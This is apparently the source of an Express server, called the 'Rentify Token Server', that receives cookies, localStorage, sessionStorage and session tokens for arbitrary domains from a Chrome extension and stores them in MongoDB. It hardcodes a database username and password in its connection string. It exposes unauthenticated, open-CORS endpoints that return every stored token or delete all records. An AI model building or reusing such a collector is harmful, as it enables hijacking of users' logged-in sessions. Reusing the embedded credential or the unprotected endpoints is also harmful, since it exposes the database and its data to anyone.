// Simple Express server to handle MongoDB operations for the Chrome extension
// This server acts as a bridge between the extension and MongoDB

const express = require('express');
const { MongoClient } = require('mongodb');
const cors = require('cors');

const app = express();
const PORT = 3002;

// MongoDB connection
const MONGODB_URI = "mongodb+srv://sahajgupta12345:1248@cluster0.ebdiiuk.mongodb.net/tockens";
const DATABASE_NAME = "tockens";
const COLLECTION_NAME = "session_tokens";

let mongoClient;
let db;
let collection;

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// Connect to MongoDB
async function connectToMongoDB() {
  try {
    console.log('🔄 Connecting to MongoDB...');
    mongoClient = new MongoClient(MONGODB_URI);
    await mongoClient.connect();
    db = mongoClient.db(DATABASE_NAME);
    collection = db.collection(COLLECTION_NAME);
    console.log('✅ Connected to MongoDB successfully');
  } catch (error) {
    console.error('❌ Failed to connect to MongoDB:', error);
    process.exit(1);
  }
}

// API Routes

// Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    message: 'Rentify Token Server is running',
    database: DATABASE_NAME,
    collection: COLLECTION_NAME,
    timestamp: new Date().toISOString()
  });
});

// Save tokens
app.post('/api/save-tokens', async (req, res) => {
  try {
    console.log('📝 Received token save request');
    console.log('   Domain:', req.body.domain);
    console.log('   URL:', req.body.url);
    console.log('   Tokens:', Object.keys(req.body.tokens || {}).length);
    console.log('   Cookies:', Object.keys(req.body.cookies || {}).length);
    console.log('   LocalStorage:', Object.keys(req.body.localStorage || {}).length);
    console.log('   SessionStorage:', Object.keys(req.body.sessionStorage || {}).length);
    
    // Validate request data
    if (!req.body.domain || !req.body.url) {
      return res.status(400).json({
        success: false,
        error: 'Missing required fields: domain and url'
      });
    }
    
    // Prepare document for MongoDB
    const document = {
      ...req.body,
      savedAt: new Date(),
      serverTimestamp: new Date().toISOString()
    };
    
    // Insert into MongoDB
    const result = await collection.insertOne(document);
    
    console.log('✅ Token document saved with ID:', result.insertedId);
    
    res.json({
      success: true,
      id: result.insertedId,
      message: 'Tokens saved successfully to MongoDB',
      database: DATABASE_NAME,
      collection: COLLECTION_NAME
    });
    
  } catch (error) {
    console.error('❌ Error saving tokens:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Get tokens
app.get('/api/get-tokens', async (req, res) => {
  try {
    console.log('📋 Received token retrieval request');
    
    const { domain, limit = 50 } = req.query;
    
    // Build query
    const query = domain ? { domain } : {};
    
    // Get tokens from MongoDB
    const tokens = await collection
      .find(query)
      .sort({ timestamp: -1 })
      .limit(parseInt(limit))
      .toArray();
    
    console.log('✅ Retrieved', tokens.length, 'token documents');
    
    res.json({
      success: true,
      count: tokens.length,
      tokens: tokens
    });
    
  } catch (error) {
    console.error('❌ Error retrieving tokens:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Delete tokens
app.delete('/api/delete-tokens', async (req, res) => {
  try {
    console.log('🗑️ Received token deletion request');
    
    const { domain, id } = req.query;
    
    let query = {};
    if (id) {
      query._id = id;
    } else if (domain) {
      query.domain = domain;
    } else {
      // Delete all if no filter provided
      query = {};
    }
    
    const result = await collection.deleteMany(query);
    
    console.log('✅ Deleted', result.deletedCount, 'token documents');
    
    res.json({
      success: true,
      deletedCount: result.deletedCount,
      message: `Deleted ${result.deletedCount} token documents`
    });
    
  } catch (error) {
    console.error('❌ Error deleting tokens:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Get database stats
app.get('/api/stats', async (req, res) => {
  try {
    const count = await collection.countDocuments();
    const sampleDoc = await collection.findOne({}, { sort: { timestamp: -1 } });
    
    res.json({
      success: true,
      totalDocuments: count,
      database: DATABASE_NAME,
      collection: COLLECTION_NAME,
      latestDocument: sampleDoc ? {
        id: sampleDoc._id,
        domain: sampleDoc.domain,
        timestamp: sampleDoc.timestamp
      } : null
    });
    
  } catch (error) {
    console.error('❌ Error getting stats:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Error handling middleware
app.use((error, req, res, next) => {
  console.error('💥 Unhandled error:', error);
  res.status(500).json({
    success: false,
    error: 'Internal server error'
  });
});

// Start server
async function startServer() {
  await connectToMongoDB();
  
  app.listen(PORT, () => {
    console.log(`🚀 Rentify Token Server running on http://localhost:${PORT}`);
    console.log(`📊 Health check: http://localhost:${PORT}/health`);
    console.log(`📝 Save tokens: POST http://localhost:${PORT}/api/save-tokens`);
    console.log(`📋 Get tokens: GET http://localhost:${PORT}/api/get-tokens`);
    console.log(`🗑️ Delete tokens: DELETE http://localhost:${PORT}/api/delete-tokens`);
    console.log(`📈 Stats: GET http://localhost:${PORT}/api/stats`);
    console.log('\n✅ Ready to receive token data from the Chrome extension!');
  });
}

// Graceful shutdown
process.on('SIGINT', async () => {
  console.log('\n🔄 Shutting down server...');
  if (mongoClient) {
    await mongoClient.close();
    console.log('🔌 MongoDB connection closed');
  }
  process.exit(0);
});

// Start the server
startServer().catch(console.error);
